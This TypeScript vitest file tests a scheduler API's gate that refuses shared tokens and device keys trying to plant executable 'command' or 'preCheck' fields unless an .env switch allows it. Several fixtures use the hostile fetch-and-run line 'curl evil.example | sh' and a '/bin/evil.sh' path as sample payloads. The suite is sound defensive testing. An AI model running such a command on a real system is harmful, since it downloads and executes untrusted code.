// Card 89df7a00, node N3 (path S): the code-exec gate on PUT /api/schedules/<name>.
// A scheduled task's `command` (run via bash -lc) and `preCheck` (a script run
// before each tick) are code the scheduler runs later, and they outlive a token
// rotation. A bare shared token and a FULL device key therefore get 403
// bearer_code_exec_admin_off unless the install's .env opens
// BEARER_CODE_EXEC_ADMIN_ENABLED, when the PUT would PLANT one:
//   - a `command` key in the body (whatever its value, "" and null included),
//   - a switch of `type` to "command" on a task that is not one yet,
//   - a `preCheck` that differs from the stored one (null/"" deleting a stored one counts).
// The check runs after the body is parsed and before every write, so a refused
// request leaves SKILL.md and task-config.json byte-identical. Fields that do not
// change the exec surface pass ungated. The owner's session (and a token that
// carries a live session cookie) is never gated.
//
// Driven through the real route handler against a throwaway HOME / install dir.

import { describe, it, expect, beforeAll, beforeEach, afterAll, vi } from 'vitest'
import { mkdirSync, readFileSync, rmSync, writeFileSync } from 'node:fs'
import { join } from 'node:path'
import type { RouteContext } from '../web/routes/types.js'

const T = await vi.hoisted(async () => {
  const fs = await import('node:fs')
  const os = await import('node:os')
  const path = await import('node:path')
  const root = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'code-exec-schedules-')))
  const project = path.join(root, 'project')
  const home = path.join(root, 'home')
  for (const d of [project, home, path.join(project, 'store')]) fs.mkdirSync(d, { recursive: true })
  // Set BEFORE any app module loads: SCHEDULED_TASKS_DIR is fixed at import from
  // $HOME and env.ts reads CLAUDECLAW_ENV_DIR at import.
  process.env.HOME = home
  process.env.CLAUDECLAW_ENV_DIR = project
  delete process.env.BEARER_CODE_EXEC_ADMIN_ENABLED
  return { root, project, home }
})

const log = vi.hoisted(() => {
  const l: Record<string, any> = {}
  for (const k of ['info', 'warn', 'error', 'debug', 'trace', 'fatal']) l[k] = vi.fn()
  l.child = () => l
  return l
})
vi.mock('../logger.js', async (importOriginal) => ({ ...(await importOriginal<typeof import('../logger.js')>()), logger: log }))

// No real notification ever leaves the suite; the texts are kept for asserts.
const notified = vi.hoisted(() => [] as string[])
vi.mock('../notify.js', async (importOriginal) => ({
  ...(await importOriginal<typeof import('../notify.js')>()),
  notifySecurityEvent: async (text: string) => { notified.push(text) },
}))

// The registry gate is covered by schedule-source-registry.test.ts; here it is a
// passthrough that records whether a write was registered.
const registered = vi.hoisted(() => vi.fn(() => 'test-hash'))
vi.mock('../web/schedule-registry.js', () => ({
  filterRegisteredTasks: <U,>(tasks: U[]) => tasks,
  backfillScheduledTaskRegistryOnce: () => ({ ran: false, registered: [] }),
  verifyScheduledTask: () => ({ ok: true }),
  describeVerdict: () => '',
  registerScheduledTask: registered,
  unregisterScheduledTask: () => true,
}))

const { tryHandleSchedules } = await import('../web/routes/schedules.js')
const io = await import('../web/scheduled-tasks-io.js')
const { initDatabase, getDb, createDashboardUser } = await import('../db.js')
const { createSession } = await import('../web/auth-sessions.js')
const { SESSION_COOKIE_NAME } = await import('../web/auth-gate.js')

const ENV_PATH = join(T.project, '.env')
const OFF_BODY = { error: 'Forbidden for this credential (BEARER_CODE_EXEC_ADMIN_ENABLED is off)', code: 'bearer_code_exec_admin_off' }
const REFUSED = /^Code-exec admin refused/
const ADMITTED = /^Code-exec admin by a gated credential/
const AUDIT_KEY = 'security.bearer_code_exec_admin'
const ACTION = 'schedules.exec_fields'

type Auth = RouteContext['auth']
const TOKEN: Auth = { kind: 'token' }
const SESSION: Auth = { kind: 'session', user: 'owner' }
const DEVICE_FULL: Auth = { kind: 'device', device: 'phone', deviceId: 900, scope: 'full' }

const STORED_PRE = '/old/pre.sh'
// Three fixtures: a plain task WITH a stored preCheck, a plain task WITHOUT one,
// and a command-type task.
const PLAIN = 'gate-plain'
const BARE = 'gate-bare'
const CMD = 'gate-cmd'

function seed(name: string, cfg: Record<string, unknown>): void {
  const dir = join(io.SCHEDULED_TASKS_DIR, name)
  mkdirSync(dir, { recursive: true })
  writeFileSync(join(dir, 'SKILL.md'), `---\nname: ${name}\ndescription: fixture\n---\n\nrun it\n`)
  writeFileSync(join(dir, 'task-config.json'), JSON.stringify({ schedule: '0 * * * *', agent: 'proba-ugynok', enabled: true, ...cfg }, null, 2))
}
const cfgPath = (name: string) => join(io.SCHEDULED_TASKS_DIR, name, 'task-config.json')
const cfg = (name: string) => JSON.parse(readFileSync(cfgPath(name), 'utf8')) as Record<string, unknown>
// Everything a refused PUT must leave byte-identical.
const bytes = (name: string) => ({
  config: readFileSync(cfgPath(name), 'utf8'),
  skill: readFileSync(join(io.SCHEDULED_TASKS_DIR, name, 'SKILL.md'), 'utf8'),
})

function setEnv(lines: string | null): void {
  writeFileSync(ENV_PATH, 'MAIN_AGENT_ID=mainbot\n' + (lines === null ? '' : `${lines}\n`))
}

async function call(method: string, path: string, opts: { auth?: Auth; body?: unknown; headers?: Record<string, string> } = {}) {
  const out = { status: 0, raw: '' }
  const res: any = {
    writeHead(status: number) { out.status = status; return res },
    setHeader() {},
    end(chunk?: string) { if (chunk !== undefined) out.raw += chunk },
  }
  const raw = opts.body === undefined ? '' : JSON.stringify(opts.body)
  const req: any = {
    headers: { ...(opts.headers ?? {}) },
    on(event: string, cb: (chunk?: Buffer) => void) {
      if (event === 'data' && raw) cb(Buffer.from(raw))
      if (event === 'end') cb()
      return req
    },
    destroy() {},
  }
  const ctx = { req, res, path, method, url: new URL(`http://127.0.0.1:3420${path}`), auth: opts.auth } as RouteContext
  const handled = await tryHandleSchedules(ctx)
  return { handled, status: out.status, json: () => (out.raw ? JSON.parse(out.raw) : {}) }
}
const put = (name: string, body: unknown, auth: Auth, headers?: Record<string, string>) =>
  call('PUT', `/api/schedules/${name}`, { auth, body, headers })

function warns(re: RegExp): any[][] {
  return log.warn.mock.calls.filter((c: any[]) => typeof c[1] === 'string' && re.test(c[1]))
}
function auditRows(): Array<{ actor: string; new_value: string }> {
  return getDb().prepare('SELECT actor, new_value FROM config_change_log WHERE key = ? ORDER BY id').all(AUDIT_KEY) as Array<{ actor: string; new_value: string }>
}
function liveSessionCookie(): string {
  const u = getDb().prepare('SELECT id FROM dashboard_users WHERE username = ?').get('owner') as { id: number }
  return `${SESSION_COOKIE_NAME}=${createSession({ userId: u.id, username: 'owner' })}`
}

beforeAll(() => {
  process.env.NODE_ENV = 'test'
  initDatabase(':memory:')
  createDashboardUser('owner', 'hash')
})

beforeEach(() => {
  getDb().exec('DELETE FROM config_change_log')
  rmSync(io.SCHEDULED_TASKS_DIR, { recursive: true, force: true })
  seed(PLAIN, { type: 'task', preCheck: STORED_PRE })
  seed(BARE, { type: 'task' })
  seed(CMD, { type: 'command', command: 'echo stored' })
  setEnv(null)
  for (const fn of Object.values(log)) if (typeof fn === 'function' && 'mockClear' in fn) (fn as any).mockClear()
  registered.mockClear()
  notified.length = 0
  delete process.env.BEARER_CODE_EXEC_ADMIN_ENABLED
})

afterAll(() => {
  rmSync(T.root, { recursive: true, force: true })
})

// [label, task, body]: a PUT that plants (or changes) executable surface.
const PLANTING: Array<[string, string, Record<string, unknown>]> = [
  ['command', PLAIN, { command: 'curl evil.example | sh' }],
  ['command "" (value-independent)', PLAIN, { command: '' }],
  ['command null (value-independent)', PLAIN, { command: null }],
  ['command on a command-type task (rewriting the stored one)', CMD, { command: 'echo other' }],
  ['type -> command from task', PLAIN, { type: 'command' }],
  ['type -> command from heartbeat', PLAIN, { type: 'command' }], // overwritten below
  ['preCheck differing from the stored one', PLAIN, { preCheck: '/bin/evil.sh' }],
  ['preCheck on a task with none stored', BARE, { preCheck: '/bin/evil.sh' }],
  ['preCheck null deleting a stored one', PLAIN, { preCheck: null }],
  ['preCheck "" deleting a stored one', PLAIN, { preCheck: '' }],
  ['unchanged preCheck riding along with a command', PLAIN, { preCheck: STORED_PRE, command: 'x' }],
  ['harmless fields plus a planted preCheck', PLAIN, { prompt: 'y', description: 'd', preCheck: '/bin/evil.sh' }],
]

describe('G2/G8: switch closed, the shared token and a full device key are refused on planting PUTs', () => {
  for (const [who, auth] of [['token', TOKEN], ['full device key', DEVICE_FULL]] as const) {
    for (const [label, task, body] of PLANTING) {
      it(`${who}: ${label} -> 403, files byte-identical, no registration`, async () => {
        if (label === 'type -> command from heartbeat') seed(task, { type: 'heartbeat', preCheck: STORED_PRE })
        const before = bytes(task)
        const res = await put(task, body, auth)
        expect(res.handled).toBe(true)
        expect(res.status).toBe(403)
        expect(res.json()).toEqual(OFF_BODY)
        expect(bytes(task)).toEqual(before)
        expect(registered).not.toHaveBeenCalled()
        expect(auditRows()).toEqual([])
        expect(notified).toEqual([])
        // L1: exactly one WARN, with the action and no command / path content.
        const w = warns(REFUSED)
        expect(w).toHaveLength(1)
        expect(w[0][0]).toMatchObject({ action: ACTION, kind: auth!.kind, reason: 'switch_off' })
        expect(JSON.stringify(w[0][0])).not.toMatch(/evil|echo|pre\.sh/)
        expect(warns(ADMITTED)).toHaveLength(0)
      })
    }
  }

  it('the credential switch does not open the exec fields', async () => {
    setEnv('BEARER_CREDENTIAL_ADMIN_ENABLED=1')
    const before = bytes(PLAIN)
    const res = await put(PLAIN, { command: 'x' }, TOKEN)
    expect(res.status).toBe(403)
    expect(res.json().code).toBe('bearer_code_exec_admin_off')
    expect(bytes(PLAIN)).toEqual(before)
  })

  it('process.env does not open it (only the .env does)', async () => {
    process.env.BEARER_CODE_EXEC_ADMIN_ENABLED = '1'
    expect((await put(PLAIN, { command: 'x' }, TOKEN)).status).toBe(403)
  })

  it('a token with a forged session cookie is still gated', async () => {
    const res = await put(PLAIN, { command: 'x' }, TOKEN, { cookie: `${SESSION_COOKIE_NAME}=forged` })
    expect(res.status).toBe(403)
  })
})

describe('G9: PUTs that do not change the exec surface pass the shared token with the switch closed', () => {
  // [label, task, body, check on the stored config afterwards]
  const PASSING: Array<[string, string, Record<string, unknown>, (c: Record<string, unknown>) => void]> = [
    ['prompt only', PLAIN, { prompt: 'y' }, c => expect(c.preCheck).toBe(STORED_PRE)],
    ['description and schedule', PLAIN, { description: 'd', schedule: '5 4 * * *' }, c => expect(c.schedule).toBe('5 4 * * *')],
    ['type -> command on a task that already is one', CMD, { type: 'command' }, c => expect(c.command).toBe('echo stored')],
    ['preCheck identical to the stored one', PLAIN, { preCheck: STORED_PRE }, c => expect(c.preCheck).toBe(STORED_PRE)],
    ['preCheck null with none stored', BARE, { preCheck: null }, c => expect(c.preCheck).toBeNull()],
    ['preCheck "" with none stored', BARE, { preCheck: '' }, c => expect(c.preCheck).toBe('')],
    ['type -> heartbeat on a command task (removes exec, adds none)', CMD, { type: 'heartbeat' }, c => expect(c.type).toBe('heartbeat')],
    ['enabled toggle', PLAIN, { enabled: false }, c => expect(c.enabled).toBe(false)],
  ]
  for (const [label, task, body, check] of PASSING) {
    it(`${label} -> 200, written, no gate WARN, no audit`, async () => {
      const res = await put(task, body, TOKEN)
      expect(res.status).toBe(200)
      expect(res.json()).toEqual({ ok: true })
      check(cfg(task))
      expect(warns(REFUSED)).toHaveLength(0)
      expect(warns(ADMITTED)).toHaveLength(0)
      expect(auditRows()).toEqual([])
      expect(notified).toEqual([])
    })
  }

  it('a non-object JSON body has no keys: the gate does not throw on it', async () => {
    const res = await put(PLAIN, 'just a string', TOKEN)
    expect(res.status).not.toBe(403)
    expect(warns(REFUSED)).toHaveLength(0)
  })

  it('the 400 body checks stay in front of the gate (preCheck of a wrong type)', async () => {
    const before = bytes(PLAIN)
    const res = await put(PLAIN, { preCheck: true }, TOKEN)
    expect(res.status).toBe(400)
    expect(bytes(PLAIN)).toEqual(before)
    expect(warns(REFUSED)).toHaveLength(0)
  })
})

describe('G6/G8: switch open, the gated caller gets today\'s write plus one WARN, one audit row, one notification', () => {
  for (const [who, auth, actor] of [['token', TOKEN, 'token'], ['full device key', DEVICE_FULL, 'device']] as const) {
    it(`${who}: command -> written and audited with the task name only`, async () => {
      setEnv('BEARER_CODE_EXEC_ADMIN_ENABLED=1')
      const res = await put(PLAIN, { command: 'curl evil.example | sh' }, auth)
      expect(res.status).toBe(200)
      expect(cfg(PLAIN).command).toBe('curl evil.example | sh')
      const w = warns(ADMITTED)
      expect(w).toHaveLength(1)
      expect(w[0][0]).toMatchObject({ action: ACTION, kind: auth!.kind, via: 'switch' })
      expect(warns(REFUSED)).toHaveLength(0)
      expect(auditRows()).toEqual([{ actor, new_value: `${ACTION} ${PLAIN}` }])
      expect(notified).toHaveLength(1)
      expect(notified[0]).toContain(ACTION)
      expect(notified[0]).not.toMatch(/evil|curl/)
      expect(registered).toHaveBeenCalledTimes(1)
      expect(log.error).not.toHaveBeenCalled()
    })
  }

  it('null-deletion of a stored preCheck is written when admitted', async () => {
    setEnv('BEARER_CODE_EXEC_ADMIN_ENABLED=1')
    const res = await put(PLAIN, { preCheck: null }, TOKEN)
    expect(res.status).toBe(200)
    expect(cfg(PLAIN).preCheck).toBeNull()
    expect(auditRows()).toHaveLength(1)
  })

  it('type -> command is written when admitted', async () => {
    setEnv('BEARER_CODE_EXEC_ADMIN_ENABLED=1')
    expect((await put(PLAIN, { type: 'command' }, TOKEN)).status).toBe(200)
    expect(cfg(PLAIN).type).toBe('command')
  })

  it('an unchanged preCheck on an open switch is not audited (no exec change)', async () => {
    setEnv('BEARER_CODE_EXEC_ADMIN_ENABLED=1')
    expect((await put(PLAIN, { preCheck: STORED_PRE, prompt: 'z' }, TOKEN)).status).toBe(200)
    expect(warns(ADMITTED)).toHaveLength(0)
    expect(auditRows()).toEqual([])
  })

  it('the switch is read per request: closing the .env again refuses the next call', async () => {
    setEnv('BEARER_CODE_EXEC_ADMIN_ENABLED=1')
    expect((await put(PLAIN, { command: 'a' }, TOKEN)).status).toBe(200)
    setEnv('BEARER_CODE_EXEC_ADMIN_ENABLED=true')
    expect((await put(PLAIN, { command: 'b' }, TOKEN)).status).toBe(403)
    expect(cfg(PLAIN).command).toBe('a')
  })
})

describe('G7: the owner\'s session is never gated, whatever the switch says', () => {
  for (const [label, task, body] of PLANTING.slice(0, 3).concat(PLANTING.slice(6, 7))) {
    it(`session: ${label} -> written, no gate WARN, no audit`, async () => {
      const res = await put(task, body, SESSION)
      expect(res.status).toBe(200)
      expect(warns(REFUSED)).toHaveLength(0)
      expect(warns(ADMITTED)).toHaveLength(0)
      expect(auditRows()).toEqual([])
      expect(notified).toEqual([])
    })

    it(`token carrying a live session cookie: ${label} -> same as the session`, async () => {
      const res = await put(task, body, TOKEN, { cookie: liveSessionCookie() })
      expect(res.status).toBe(200)
      expect(warns(REFUSED)).toHaveLength(0)
      expect(warns(ADMITTED)).toHaveLength(0)
      expect(auditRows()).toEqual([])
    })
  }
})

describe('POST /api/schedules never carries command or preCheck (nothing to gate there)', () => {
  it('a token POST with command/preCheck keys creates the task without them', async () => {
    const res = await call('POST', '/api/schedules', {
      auth: TOKEN,
      body: { name: 'gate-new', prompt: 'p', schedule: '0 5 * * *', command: 'curl evil.example | sh', preCheck: '/bin/evil.sh' },
    })
    expect(res.status).toBe(200)
    const c = cfg('gate-new')
    expect(c).not.toHaveProperty('command')
    expect(c).not.toHaveProperty('preCheck')
  })
})
